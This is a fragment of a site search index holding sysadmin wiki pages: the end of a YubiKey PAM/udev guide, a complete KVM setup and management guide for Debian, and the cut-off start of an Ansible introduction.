pam_yubico.so mode=challenge-response auth [success=2 default=ignore] pam_unix.so nullok_secure auth [success=1 default=ignore] pam_winbind.so krb5_auth krb5_ccache_type=FILE cached_login try_first_pass # here's the fallback if no module succeeds auth requisite pam_deny.so # prime the stack with a positive return value if there isn't one already; # this avoids us returning an error just because nothing sets a success code # since the modules above will each just jump around auth required pam_permit.so # and here are more per-package modules (the \"Additional\" block) auth optional pam_cap.so # end of pam-auth-update config udev linkWe’ll install the udev rule:\ncp /lib/udev/rules.d/69-yubikey.rules /etc/udev/rules.d/ and override it to add a custom script (screensaver lock) (/lib/udev/rules.d/69-yubikey.rules):\nACTION!=\"add|change\", GOTO=\"yubico_end\" # Udev rules for letting the console user access the Yubikey USB # device node, needed for challenge/response to work correctly. # Yubico Yubikey II ATTRS{idVendor}==\"1050\", ATTRS{idProduct}==\"0010|0110|0111|114|116\", \\ ENV{ID_SECURITY_TOKEN}=\"1\" LABEL=\"yubico_end\" # Launch on remove ACTION==\"remove\", SUBSYSTEM==\"usb\", ENV{ID_VENDOR_ID}==\"1050\", ENV{ID_MODEL_ID}==\"0010\", RUN+=\"/path/yubi_remove_script.sh\" # Launch on insert # ACTION==\"add\", SUBSYSTEM==\"usb\", ATTRS{idVendor}==\"1050\", ATTRS{idProduct}==\"0010\", RUN+=\"/path/yubi_add_script.sh\" You can test if udev sees your key correctly with this command (try to insert and remove it):\nudevadm monitor --property Then reload udev rules:\nudevadm control --reload-rules udevadm trigger And create the script where you’ve declared it (yubi_script.sh):\n#! /bin/bash export DISPLAY=\":0\" su -c \"/usr/bin/xscreensaver-command -lock\" And change the username to your desired one. Don’t forget to add execution rights:\nchmod 755 yubi_script.sh FAQ linkHow do I enable debug? linkIt’s easy to add debug mode. Simply add “debug” to the PAM line (/etc/pam.d/common-auth):\n# # /etc/pam.d/common-auth - authentication settings common to all services # # This file is included from other service-specific PAM config files, # and should contain a list of the authentication modules that define # the central authentication scheme for use on the system # (e.g., /etc/shadow, LDAP, Kerberos, etc.). The default is to use the # traditional Unix authentication mechanisms. # # As of pam 1.0.1-6, this file is managed by pam-auth-update by default. # To take advantage of this, it is recommended that you configure any # local modules either before or after the default block, and use # pam-auth-update to manage selection of other modules. See # pam-auth-update(8) for details. # here are the per-package modules (the \"Primary\" block) auth sufficient pam_yubico.so debug mode=challenge-response auth [success=2 default=ignore] pam_unix.so nullok_secure auth [success=1 default=ignore] pam_winbind.so krb5_auth krb5_ccache_type=FILE cached_login try_first_pass # here's the fallback if no module succeeds auth requisite pam_deny.so # prime the stack with a positive return value if there isn't one already; # this avoids us returning an error just because nothing sets a success code # since the modules above will each just jump around auth required pam_permit.so # and here are more per-package modules (the \"Additional\" block) auth optional pam_cap.so # end of pam-auth-update config and create debug file information:\ntouch /var/run/pam-debug.log chmod 666 /var/run/pam-debug.log You can now check the /var/run/pam-debug.log file.\nUSB error: Access denied (insufficient permissions) linkA possible solution is to add a group to udev and make your user belong to that group. Example (/etc/udev/rules.d/70-yubikey.rules):\nACTION==\"add|change\", SUBSYSTEM==\"usb\", ATTRS{idVendor}==\"1050\", ATTRS{idProduct}==\"0010\", MODE=\"0664\", GROUP=\"yubikey\" Here you need to create a “yubikey” group and add your current user to that group.\nNow reload the rules:\nudevadm control --reload-rules udevadm trigger It should work now.\nReferences linkhttp://craoc.fr/doku.php?id=yubikey#configuration_de_la_yubikey\n"
            }
        );
    index.add(
            {
                id:  157 ,
                href: "\/KVM_:_Mise_en_place_de_KVM\/",
                title: "KVM: Setting Up KVM",
                description: "A comprehensive guide on setting up and configuring KVM virtualization on Linux systems, including performance optimization, networking, VM management, and advanced features.",
                content: " Software version 0.12.5 Operating System Debian 6 Website KVM Website Last Update 03/03/2015 Introduction linkKVM (for Kernel-based Virtual Machine) is a full virtualization solution for Linux on x86 hardware containing virtualization extensions (Intel VT or AMD-V). It consists of a loadable kernel module, kvm.ko, that provides the core virtualization infrastructure and a processor specific module, kvm-intel.ko or kvm-amd.ko. KVM also requires a modified QEMU although work is underway to get the required changes upstream.\nUsing KVM, one can run multiple virtual machines running unmodified Linux or Windows images. Each virtual machine has private virtualized hardware: a network card, disk, graphics adapter, etc.\nThe kernel component of KVM is included in mainline Linux, as of 2.6.20.\nKVM is open source software.\nInstall linkTo install and run KVM on Debian, follow these steps:\nRun these commands as root:\naptitude update aptitude install kvm qemu bridge-utils libvirt-bin virtinst qemu is necessary, this is the base kvm is for full acceleration (need processor with vmx or svm technology) bridge-utils are tools for bridging VMs network libvirt is a managing solution for your VMs Depending on if you are using an AMD or Intel processor, run one of these commands:\nmodprobe kvm-amd or\nmodprobe kvm-intel Then add it to /etc/modules:\nkvm-intel Configuration linkSystem performances linkTo get as performances as possible, we’ll need to set some specific options.\nDisks linkFirst, we’ll set the disks algorithm to deadline in grub:\n# If you change this file, run 'update-grub' afterwards to update # /boot/grub/grub.cfg. GRUB_DEFAULT=0 GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=`lsb_release -i -s 2\u003e /dev/null || echo Debian` GRUB_CMDLINE_LINUX_DEFAULT=\"quiet elevator=deadline\" GRUB_CMDLINE_LINUX=\"\" # Uncomment to enable BadRAM filtering, modify to suit your needs # This works with Linux (no patch required) and with any kernel that obtains # the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...) #GRUB_BADRAM=\"0x01234567,0xfefefefe,0x89abcdef,0xefefefef\" # Uncomment to disable graphical terminal (grub-pc only) #GRUB_TERMINAL=console # The resolution used on graphical terminal # note that you can use only modes which your graphic card supports via VBE # you can see them in real GRUB with the command `vbeinfo' #GRUB_GFXMODE=640x480 # Uncomment if you don't want GRUB to pass \"root=UUID=xxx\" parameter to Linux #GRUB_DISABLE_LINUX_UUID=true # Uncomment to disable generation of recovery mode menu entries #GRUB_DISABLE_LINUX_RECOVERY=\"true\" # Uncomment to get a beep at grub start #GRUB_INIT_TUNE=\"480 440 1\" And update grub:\nupdate-grub Now, to reduces data copies and bus traffic, when you’re using LVM partitions, disable the cache and use virtio drivers which are the fastest:\nvirt-install ... --file=/dev/vg-name/lv-name,cache=none,if=virtio ... Memory linkThen, we will enable KSM. Kernel Samepage Merging (KSM) is a feature of the Linux kernel introduced in the 2.6.32 kernel. KSM allows for an application to register with the kernel to have its pages merged with other processes that also register to have their pages merged. For KVM, the KSM mechanism allows for guest virtual machines to share pages with each other. In an environment where many of the guest operating systems are similar, this can result in significant memory savings.\nTo enable it, add this line:\n#!/bin/sh -e # # rc.local # # This script is executed at the end of each multiuser runlevel. # Make sure that the script will \"exit 0\" on success or any other # value on error. # # In order to enable or disable this script just change the execution # bits. # # By default this script does nothing. # KSM echo 1 \u003e /sys/kernel/mm/ksm/run exit 0 You can see at anytime the status of KSM by:\nfor i in /sys/kernel/mm/ksm/*; do echo -n \"$i: \"; cat $i; done And in addition, we will disable swapiness to avoid having too much memory consumption. Add those lines in sysctl:\n# Swapiness vm.swappiness = 1 Network linkFor security and performances issues, you should disable ipv6 on bridged interfaces by adding those 3 lines:\nnet.bridge.bridge-nf-call-ip6tables = 0 net.bridge.bridge-nf-call-iptables = 0 net.bridge.bridge-nf-call-arptables = 0 When you will create network interfaces, uses tap with virtio drivers:\nvirt-install ... --network tap,bridge=br0,model=virtio ... Virtio linkIf you want to always enable VirtIO, to get maximum performances, load those modules:\nvirtio_blk virtio_pci virtio_net Add user to group link The installation of kvm created a new system group named kvm in /etc/group. You need to add the user accounts that will run kvm to this group (replace username with the user account name to add): adduser username kvm For those who would like to use libvirt (recommanded), add your user to this group too: adduser username libvirt Storage linkThere are 2 types of solutions:\nDisk Image: Easier but slower Need LVM acknoledges but is faster and simpler to backup (LVM Snapshot) Create Disks image linkCreate a virtual disk image (10 gigabytes in the example, but it is a sparse file and will only take as much space as is actually used, which is 0 at first, as can be seen with the du command: du vdisk.qcow, while ls -l vdisk.qcow shows the sparse file size):\nqemu-img create -f qcow2 disk0.qcow2 10G You can also use QED, which is faster than qcow2:\nqemu-img create -f qed disk0.qed 10G Create LVM LV linkTo create a Logical Volume, simply:\nlvcreate -L 4G -n vm-name vg-name -L: size of the logical volume -n: Name of the VM vg-name: replace by your Volume Group Name Network Interfaces linkBridged configuration linkNow modify your /etc/network/interfaces file to add bridged configuration:\nauto lo br0 iface lo inet loopback # The primary network interface iface br0 inet static address 192.168.0.80 netmask 255.255.255.0 gateway 192.168.0.252 broadcast 192.168.0.255 network 192.168.0.0 bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off br0 is replacing eth0 for bridging.\nHere is another configuration with 2 network cards and 2 bridges:\n# This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo br0 br1 iface lo inet loopback # DMZ iface br0 inet static address 192.168.10.1 netmask 255.255.255.0 gateway 192.168.10.254 network 192.168.10.0 broadcast 192.168.10.255 bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off # Internal iface br1 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.254 network 192.168.0.0 broadcast 192.168.0.255 bridge_ports eth1 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off VLAN Bridged configuration linkAnd a last one with Vlans bridged (look at this documentation to enable it before):\nWe will need to use etables (iptables for bridged interfaces). Install this:\naptitude install ebtables Check you etables configuration:\nEBTABLES_LOAD_ON_START=\"yes\" EBTABLES_SAVE_ON_STOP=\"yes\" EBTABLES_SAVE_ON_RESTART=\"yes\" And enable VLAN tagging on bridged interfaces:\nebtables -t broute -A BROUTING -i eth0 -p 802_1Q -j DROP # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback # The primary network interface allow-hotplug eth0 auto eth0 iface eth0 inet manual auto eth0.110 iface eth0.110 inet manual vlan_raw_device eth0 # The bridged interface auto vmbr0 iface vmbr0 inet static address 192.168.100.1 netmask 255.255.255.0 network 192.168.100.0 broadcast 192.168.100.255 gateway 192.168.100.254 # dns-* options are implemented by the resolvconf package, if installed dns-nameservers 192.168.100.254 dns-search deimos.fr bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off auto vmbr0.110 iface vmbr0.110 inet static address 192.168.110.1 netmask 255.255.255.0 bridge_ports eth0.190 bridge_stp off bridge_maxwait 0 bridge_fd 0 Nat configuration linkNat is the default configuration. But you may need to do some adjustements. Add the forwarding to sysctl:\nnet.ipv4.ip_forward = 1 Check that the connecting is active:\n\u003e virsh net-list --all Name State Autostart ----------------------------------------- default inactive no If it’s not the case, then set the default network configuration:\nvirsh net-define /etc/libvirt/qemu/networks/default.xml virsh net-autostart default virsh net-start default Then you should see it enable:\n\u003e virsh net-list --all Name State Autostart ----------------------------------------- default active yes Edit the configuration to add your range of IP:\ndefault Now it’s done, restart libvirt.\nIptables linkYou may need to configure iptables for example if you’re on a dedicated box where the provider doesn’t allow bridge configuration. Here is a working iptables configuration to permit incoming connexions to Nated guests:\n#!/bin/bash # Made by Pierre Mavro / Deimosfr # This script will Nat you KVM/containers hosts # and help you to get access from outside #------------------------------------------------------------------------- # Essentials #------------------------------------------------------------------------- IPTABLES='/sbin/iptables' modprobe nf_conntrack_ftp #------------------------------------------------------------------------- # Physical and virtual interfaces definitions #------------------------------------------------------------------------- # Interfaces wan1_if=\"eth0\" wan2_if=\"eth0:0\" kvm_if=\"virbr0\" #------------------------------------------------------------------------- # Networks definitions #------------------------------------------------------------------------- # Networks wan1_ip=\"x.x.x.x\" wan2_ip=\"x.x.x.x\" vms_net=\"192.168.122.0/24\" # Dedibox internals IPs web_ip=\"192.168.122.10\" mail_ip=\"192.168.122.20\" #------------------------------------------------------------------------- # Global Rules input / output / forward #------------------------------------------------------------------------- # Flushing tables $IPTABLES -F $IPTABLES -X $IPTABLES -t nat -F # Define default policy $IPTABLES -P INPUT DROP $IPTABLES -P OUTPUT ACCEPT $IPTABLES -P FORWARD ACCEPT ## Loopback accepte ${IPTABLES} -A FORWARD -i lo -o lo -j ACCEPT ${IPTABLES} -A INPUT -i lo -j ACCEPT ${IPTABLES} -A OUTPUT -o lo -j ACCEPT # Allow KVM DHCP/dnsmasq ${IPTABLES} -A INPUT -i $kvm_if -p udp --dport 67 -j ACCEPT ${IPTABLES} -A INPUT -i $kvm_if -p udp --dport 69 -j ACCEPT $IPTABLES -A INPUT -j ACCEPT -d $vms_net $IPTABLES -A INPUT -j ACCEPT -m state --state ESTABLISHED,RELATED #------------------------------------------------------------------------- # Allow masquerading for KVM VMs #------------------------------------------------------------------------- # Activating masquerade to get Internet from KVM VMs $IPTABLES -t nat -A POSTROUTING -o $wan1_if -s $vms_net -j MASQUERADE #------------------------------------------------------------------------- # Allow ports on KVM host #------------------------------------------------------------------------- # Allow ICMP $IPTABLES -A INPUT -j ACCEPT -p icmp # SSH access $IPTABLES -A INPUT -j ACCEPT -p tcp --dport 22 # HTTPS access $IPTABLES -A INPUT -j ACCEPT -p tcp --dport 443 #------------------------------------------------------------------------- # Redirections for incoming connections (wan1) #------------------------------------------------------------------------- # HTTP access $IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -d $wan1_ip -j DNAT --to-destination $web_ip:80 # HTTP access $IPTABLES -t nat -A PREROUTING -p tcp --dport 443 -d $wan1_ip -j DNAT --to-destination $web_ip:443 # Mail for mailsrv $IPTABLES -t nat -A PREROUTING -p tcp --dport 25 -d $wan1_ip -j DNAT --to-destination $mail_ip:25 #------------------------------------------------------------------------- # Reload fail2ban #------------------------------------------------------------------------- /etc/init.d/fail2ban reload Create a VM linkNew method (with libvirt) link If you want to create a VM with disk image and bridged configuration: virt-install --ram=1024 --name=lenny --file=/mnt/vms/lenny/disk0.qcow2 --cdrom=/mnt/isos/debian-6.0.4-amd64-CD-1.iso --hvm --vnc --noautoconsole --accelerate --network=bridge:br0,model=virtio If you are using LVM and bridged configuration: virt-install --os-variant=debiansqueeze --ram=256 --name=vmname --disk path=/dev/mapper/vgname-lvname,device=disk,cache=none,bus=virtio --cdrom=/mnt/isos/debian-6.0.4-amd64-CD-1.iso --hvm --vnc --noautoconsole --accelerate --network=bridge:br0,model=virtio Now a configuration file for this VM has been created in /etc/libvirt/qemu.\nIf you are using LVM and nated configuration: virt-install --os-variant=debiansqueeze --ram=256 --name=vmname --disk path=/dev/mapper/vg--kvm-vmname,device=disk,cache=none,bus=virtio --cdrom=/mnt/isos/debian-6.0.5-amd64-CD-1.iso --hvm --vnc --noautoconsole --accelerate --network=network:default,model=virtio Old method (without libvirt) linkTo make a clean installation of a Guest KVM, you can create a script for each VM you want to create.\nhere is a script exemple to launch a KVM using VNC for display instead of X11 display:\n#!/bin/sh clear # Var Definition # Name of your KVM HOSTNAME=\"Client 1\" # Path to your virtual hard drive image HDD=\"-hda /mnt/vms/lenny/disk0.qcow2\" # Path to your CD-Rom # note: you can use an iso CDROM=\"-cdrom /dev/cdrom\" # Boot Sequence # note: \"c\": HDD, \"d\": CD-Rom, \"a\": Floppy BOOT=\"-boot c\" # TAP Device Creation # note: don't forget to change \"ifname\" if you are using mutliples KVM's! # This is for \"bridged mode\". if you wan't to use the \"user mode\", remove the \"TAP\" variable TAP=\"-net tap,vlan=0,ifname=tap0,script=/etc/kvm/kvm-ifup\" # Virtual Network Card parameters # note: default model is a \"ne2k_pci\" (rtl8029) and works on Windows XP and Vista # \"rtl8139\" has better performances and is detected as a 100Mb Adapter # \"pcnet\" or \"ai82551\" are better for BSD's NIC=\"-net nic,model=rtl8139,vlan=0\" # Amount of memory (in Megabyte) MEM=\"-m 384\" # Miscelaneous options # note: \"-k fr\": if using VNC, it corrects the keyboard problem # \"-usbdevice\" tablet: correct the problem of mouse desynchronisation # \"-no-acpi\": if you are installing a Windows based guest or a BSD MISC=\"-k fr -localtime -no-acpi -usbdevice tablet\" # VNC Mode # note: \"-vnc :\": allows clients to connect to specified display only ON (not \"from\") the specified IP Address VNC=\"-vnc 192.168.0.80:1\" # Starting the KVM # Cheapy Design by Hostin!! ;-p echo -e \"\\n\\n################################\" echo \"##### Starting KVM with... #####\" echo \"################################\" echo -e \"\\n Hard Disk: \\\"$HDD\\\" \" echo \" CD-Rom: \\\"$CDROM\\\" \" echo \" Boot Sequence: \\\"$BOOT\\\" \" echo \" TAP Device: \\\"$TAP\\\" \" echo \" Virtual Network Card: \\\"$NIC\\\" \" echo \" Memory size: \\\"$MEM\\\" \" echo \" Miscelaneous: \\\"$MISC\\\" \" echo \" VNC Mode: \\\"$VNC\\\" \" echo -e \"\\n################################\" echo -e \"\\n\\n######################################################################\" echo \"Kernel-based Virtual Machine: $HOSTNAME - Running\" echo \"######################################################################\" echo -e \"\\n\\nLoading kvm-intel kernel module...\" modprobe kvm-intel exec kvm $HDD $CDROM $BOOT $TAP $NIC $MEM $MISC $VNC Manage VM linkManual method linkAfter installation is complete, run it with:\nkvm -hda vdisk.img -m 384 Here is a good solution for *BSD guests:\n/usr/local/bin/qemu-system-x86_64 /data/virt/netbsd.img \\ -net nic,macaddr=00:56:01:02:03:04,model=i82551 \\ -net tap,ifname=tap0,script=/etc/qemu-ifup \\ -m 256 \\ -no-acpi \\ -localtime \\ -daemonize Virt Manager (GUI) linkYou can easily install locally or remotly this GUI to manage your VMs:\napt-get install virt-manager virt-viewer Just connect remotly or locally and double click to launch a VM (and use it as vnc).\nVirt Manager (Command line) linkUse virsh command to manage your VMs. Here is a list of useless examples.\nStart, stop, list link List VMs: $ virsh list --all Id Name State ---------------------------------- 2 Mails running 4 Backups running 6 Web running virsh start vm_name Shutdown gracefully a VM: virsh shutdown vm_name Force to shutdown the VM: virsh destroy vm_name Suspend, restore link Suspend a VM: virsh suspend vm_name virsh resume vm_name Delete link Will delete configuration file (xml in /etc/libvirt/qemu/): virsh undefine vm_name Backups, restore link Save a VM: virsh save vm_name vm_name.dump Restore a VM: virsh restore vm_name.dump Autostart linkIf you want to set a VM to start automatically on boot:\nvirsh autostart Snapshots linkThere is a long list on how to manage snapshots (I suggest that link). There are 2 kinds of snapshot:\nInternal: snapshot are stored inside the image file External: snapshot are stored in an external image file Create a snapshot linkTo create the snapshot:\nvirsh snapshot-create-as --domain --disk-only --diskspec vda,snapshot=external,file=/mnt/vms/.qed --atomic : set the vm domain name : the name of the snapshot (not as a file, but as it will be displayed on virsh) : a description of that snapshot vda: select the name of the VM device to backup : set the full path of the snapshot file (where it should be stored) Once that command launched, the base VM disk (not the snapshot) becomes read only and the snapshot is read/write. You could copy the base for the backup if you want.\nYou can check your disk currently used for write:\n\u003e virsh domblklist pma_qedtest Target Source ------------------------------------------------ vda /mnt/vms/vms/pma_qedtest-snap.qed External snapshot linkWith the external snapshot, there are multiple way to create snapshots (blockcommit, blockpull…). They all got their pros and cons.\nblockpull linkThis is the simplest and oldest way to merge the base to the snapshot:\nvirsh blockpull --domain test --path /mnt/vms/.img When finished (look at iotop status), you can remove the base image and keep the snapshot.\nblockcommit linkThe blockcommit, is my favorite way to create backups. The actual problem is on Debian 7, this is not present as virsh require a version upper or equal to 0.10.2 and it’s only available on Debian unstable for the moment. Anyway, if you’ve got this version, here is how to do it.\nNow we’ve got something like that:\n[base(1)]---\u003e[snapshot(2)] If I now want to merge snapshot to base and got only one disk file:\n[base(1)]\u003c---[snapshot(2)] [base(2)] you need to follow it:\nvirsh blockcommit --domain vda --base /mnt/vms/.qed --top /mnt/vms/.qed --wait --verbose –base: the actual read only base disk –top: the snapshot disk file to merge in base Others linkReload configuration linkIf you have made modifications on the xml file and wish reload it:\nvirsh define /etc/libvirt/qemu/my_vm.xml Serial Port Connection linkIf you want to connect to serial port, you need to have configured your guest to enable it, then connect with virsh:\nvirsh connect Add a disk to an existing VM linkThis is very simple (my VM is called ’ed’):\nvirsh attach-disk vmname /dev/mapper/vg-lv sdb vmname: set the name of your VM /dev/mapper/vg-lv: set the disk sdb: the device name shown inside the VM On Debian 6, there is a little bug. So the configuration needs to be reviewed. Replace the current configuration by the running one:\nvmname=ed virsh dumpxml $vmname \u003e /etc/libvirt/qemu/$vmname.xml virsh shutdown $vmname Then edit the xml of your VM and change driver name from ‘phy’ to ‘qemu’:\n[...] [...] And load it:\nvirsh define /etc/libvirt/qemu/$vmname.xml Now you can launch your VM\nBind CPU/Cores to a VM linkIf you want to bind some CPU/Cores to a VM/Container, there is a solution called CPU Pining :-). First, look at the available cores on your server:\n\u003e grep -e processor -e core /proc/cpuinfo | sed 's/processor/\\nprocessor/' processor\t: 0 core id\t: 0 cpu cores\t: 4 processor\t: 1 core id\t: 1 cpu cores\t: 4 processor\t: 2 core id\t: 2 cpu cores\t: 4 processor\t: 3 core id\t: 3 cpu cores\t: 4 processor\t: 4 core id\t: 0 cpu cores\t: 4 processor\t: 5 core id\t: 1 cpu cores\t: 4 processor\t: 6 core id\t: 2 cpu cores\t: 4 processor\t: 7 core id\t: 3 cpu cores\t: 4 You can see there are 7 cores (called processor). In fact there are 4 cores with 2 thread each on this CPU. That’s why there are 4 cores id and 8 detected cores.\nSo here is the list of the cores with their attached core:\ncore id 0: processors 0 and 4 core id 1: processors 1 and 5 core id 2: processors 2 and 6 core id 3: processors 3 and 7 Now, if I want on a VM a dedicated CPU with it’s additional thread, I would prefer do 2 virtual CPU (vpcu) and bind the good core on it. So first, look at the current configuration:\n\u003e virsh vcpuinfo vmname VCPU: 0 CPU: 6 State: running CPU time: 7,5s CPU Affinity: yyyyyyyy You can see there is only 1 vcpu. And all the cores of the CPU are used (count the number of ‘y’ in CPU Affinity, here 8). If we want the best performances, we need to add as many vcpu as we want of cores on a VM, you will see the advantage later… So let’s add some cores:\nvirsh setvcpus So here for example, we set 4 vcpus. That mean the VM will see 4 cores! Now, we’re going to bind processor 0 and 4 on both vcpu! Why? Because if an application doesn’t know how to multithread, it will use all the cores! And if applications knows how to use multi cores, they will use it like that. So in any case, you will have good performances :-).\nvirsh vcpupin vmname 0 2,6,3,7 virsh vcpupin vmname 1 2,6,3,7 virsh vcpupin vmname 2 2,6,3,7 virsh vcpupin vmname 3 2,6,3,7 So now I added 4 virtuals CPU (0 and 1) and added 2 cores (2 and 3) with their associated thread (6 and 7).\nIn Debian 6 version, it will be done on the fly, but won’t be set definitely in the configuration. That’s why you’ll need to add those parameters (cpuset) in the XML of your VM:\n[...] 4 [...] Do not forget to apply the new configuration:\nvirsh define /etc/libvirt/qemu/vmname.xml We can now check the new configuration:\n\u003e virsh vcpuinfo vmname VCPU: 0 CPU: 2 State: running CPU time: 8,1s CPU Affinity: --yy--yy VCPU: 1 CPU: 2 State: running CPU time: 2,6s CPU Affinity: --yy--yy VCPU: 2 CPU: 3 State: running CPU time: 2,7s CPU Affinity: --yy--yy VCPU: 3 CPU: 7 State: running CPU time: 6,6s CPU Affinity: --yy--yy If you want to know more how cpusets works, follow that link.\nOthers linkConvert a disk based VM on a LVM parition linkYou may have a couple of VM based on disk image like qcow2 and my want to convert them into LVM partition. Fortunatly, there is a solution! First convert into your qcow into raw format:\nkvm-img convert disk0.qcow2 -O raw disk0.raw and then put the raw bits into the LVM volume:\ndd if=disk0.raw of=/dev/vg-name/lv-name bs=1M Now edit your xml file and make those changes:\n... ... Change to:\n... ... Now reload your xml file of VM:\nvirsh define /etc/libvirt/qemu/vm.xml And now you can start the VM :-)\nConvert an LVM parition to a disk image linkTo convert an LVM to QED for example, launch that command and adapt it:\nqemu-img convert -O qed /dev/vg_name/lv_name/ /var/lib/libvirt/images/image_name.qed Then edit the VM libvirt configuration file like this:\nNow reload your xml file of VM:\nvirsh define /etc/libvirt/qemu/vm.xml And now you can start the VM :-)\nTransfert a LVM disk based VM linkIf you need to transfer from one server to another a VM based on LVM, there is an easy way solution. You need to first stop the Virtual Machine to have consistency datas, then you can transfer them:\ndd if=/dev/vgname/lvname bs=1M | ssh root@new-server 'dd of=/dev/vgname/lvname bs=1M' Do not forget to transfer xml file configuration of the VM and adapt LVM disks name if needed. Then “virsh define” the new xml file.\nGraphically access to VMs without Virt Manager linkIf you want to access thought your VMs without installing any manager, you can. First you have to be sure when you created your VM, you entered the –vnc option or when you launch it, you use this option.\nIf if it’s not hte case and you’re using libvirt, please add it to your wished VM:\n... Now this is done, you need to change the default listening address of VNC on libvirt. By default, it’s listening on 127.0.0.1. This is the most secure choice. However, you may have a secured LAN and wished to open it to anybody. Open so the qemu.conf and modify it to bind on you secure server IP address:\nvnc_listen = \"192.168.0.1\" If you need as well to activate secure VNC connections, please activate TLS in the same config file.\nThen restart or reload libvirt-bin.\nSuspend guests VMs on host shutdown linkIf your desktop hosts several VMs, it could be interesting to auto suspend them when you restart your computer for example. There is a service for that to make it easy. Simply edit libvirt-guests file configuration:\n# URIs to check for running guests # example: URIS='default xen:/// vbox+tcp://host/system lxc:///' URIS=qemu:///system # action taken on host boot # - start all guests which were running on shutdown are started on boot # regardless on their autostart settings # - ignore libvirt-guests init script won't start any guest on boot, however, # guests marked as autostart will still be automatically started by # libvirtd ON_BOOT=ignore # Number of seconds to wait between each guest start. Set to 0 to allow # parallel startup. START_DELAY=0 # action taken on host shutdown # - suspend all running guests are suspended using virsh managedsave # - shutdown all running guests are asked to shutdown. Please be careful with # this settings since there is no way to distinguish between a # guest which is stuck or ignores shutdown requests and a guest # which just needs a long time to shutdown. When setting # ON_SHUTDOWN=shutdown, you must also set SHUTDOWN_TIMEOUT to a # value suitable for your guests. ON_SHUTDOWN=suspend # If set to non-zero, shutdown will suspend guests concurrently. Number of # guests on shutdown at any time will not exceed number set in this variable. PARALLEL_SHUTDOWN=3 # Number of seconds we're willing to wait for a guest to shut down. If parallel # shutdown is enabled, this timeout applies as a timeout for shutting down all # guests on a single URI defined in the variable URIS. If this is 0, then there # is no time out (use with caution, as guests might not respond to a shutdown # request). The default value is 300 seconds (5 minutes). SHUTDOWN_TIMEOUT=600 # If non-zero, try to bypass the file system cache when saving and # restoring guests, even though this may give slower operation for # some file systems. #BYPASS_CACHE=0 That’s all :-)\nFAQ linkRead the manual page for more information:\nman kvm warning: could not open /dev/net/tun: no virtual network emulation linkThis happen when you want to charge the tun device and you don’t have permissions. Simply run your kvm command with sudo.\nSolaris reboot all the time on grub menu link Run through the installer as usual On completion and reboot, the VM will perpetually reboot. “Stop” the VM. Start it up again, and immediately open a vnc console and select the Safe Boot from the options screen When prompted if you want to try and recover the boot block, say yes You should now have a Bourne terminal with your existing filesystem mounted on /a Run /a/usr/bin/bash (my preferred shell) export TERM=xterm vi /a/boot/grub/menu.1st (editing the bootloader on your mounted filesystem), to add “kernel/unix” to the kernel options for the non-safe-mode boot. Ex: ... kernel$ /platform/i86pc/multiboot -B $ZFS-BOOTFS kernel/unix ... Save the file and restart the VM - that’s it! error: Timed out during operation: cannot acquire state change lock linkIf you got this kind of error while starting a VM:\nerror: Failed to start domain error: Timed out during operation: cannot acquire state change lock it’s due to a bug and could be resolved like this:\n/etc/init.d/libvirt-bin stop rm -Rf /var/run/libvirt /etc/init.d/libvirt-bin start Ressources link https://help.ubuntu.com/community/KVM Documentation for Speeding up QEMU with KVM and KQEMU Documentation on using KVM on Ubuntu Virtualization With KVM KVM Guest Management With Virt-Manager http://www.linux-kvm.org/page/Using_VirtIO_NIC http://blog.loftninjas.org/2008/10/22/kvm-virtio-network-performance/ http://www.linux-kvm.org/page/Tuning_KVM http://blog.bodhizazen.net/linux/improve-kvm-performance/ http://blog.allanglesit.com/2011/05/linux-kvm-vlan-tagging-for-guest-connectivity/ https://wiki.archlinux.org/index.php/KVM#Enabling_KSM http://fr.gentoo-wiki.com/wiki/Libvirt http://docs.redhat.com/docs/en-US/Red_Hat_Enterprise_Linux/6/html/Virtualization_Host_Configuration_and_Guest_Installation_Guide/chap-Virtualization_Host_Configuration_and_Guest_Installation_Guide-Network_Configuration.html#sect-Virtualization_Host_Configuration_and_Guest_Installation_Guide-Network_Configuration-Network_address_translation_NAT_with_libvirt http://docs.fedoraproject.org/en-US/Fedora/13/html/Virtualization_Guide/ch25s06.html http://berrange.com/posts/2010/02/12/controlling-guest-cpu-numa-affinity-in-libvirt-with-qemu-kvm-xen/ http://wiki.kartbuilding.net/index.php/KVM_Setup_on_Debian_Squeeze http://kashyapc.fedorapeople.org/virt/lc-2012/snapshots-handout.html http://fedoraproject.org/wiki/Features/Virt_Live_Snapshots https://www.redhat.com/archives/libvirt-users/2012-September/msg00063.html "
            }
        );
    index.add(
            {
                id:  158 ,
                href: "\/ansible-a-powerful-agentless-configuration-management-and-orchestrator-solution\/",
                title: "Ansible: A Powerful Agentless Configuration Management and Orchestrator Solution",
                description: "Learn how to use Ansible, an agentless IT automation tool for configuration management, application deployment, and task orchestration",
                content: " Software version 1.6.2 Operating System Debian 8 Website Ansible Website Last Update 26/02/2015 Introduction linkAnsible is an IT automation tool. It can configure systems, deploy software, and orchestrate more advanced IT tasks such as continuous deployments or zero downtime rolling updates.\nAnsible’s goals are foremost those of simplicity and maximum ease of use. It also has a strong focus on security and reliability, featuring a minimum of moving parts, usage of OpenSSH for transport (with an accelerated socket mode and pull modes as alternatives), and a language that is designed around auditability by humans – even those not familiar with the program.\nWe believe simplicity is relevant to all sizes of environments and design for busy users of all types – whether this means developers, sysadmins, release engineers, IT managers, and everywhere in between. Ansible is appropriate for managing small setups with a handful of instances as well as enterprise environments with many thousands.\nAnsible manages machines in an agentless manner. There is never a question of how to upgrade remote daemons or the problem of not being able to manage systems because daemons are uninstalled. As OpenSSH is one of the most peer reviewed open source components, the security exposure of using the tool is greatly reduced. Ansible is decentralized – it relies on your existing OS credentials to control access to remote machines; if needed it can easily connect with Kerberos, LDAP, and other centralized authentication management systems.1\nThe documentation is enough complete and well done to avoid rewriting things here. However some tricky things can be done and that’s what I’m trying to cover here.\nInstallation linkTo install Ansible, you have 2 choices:\naptitude install ansible Or with pip (require 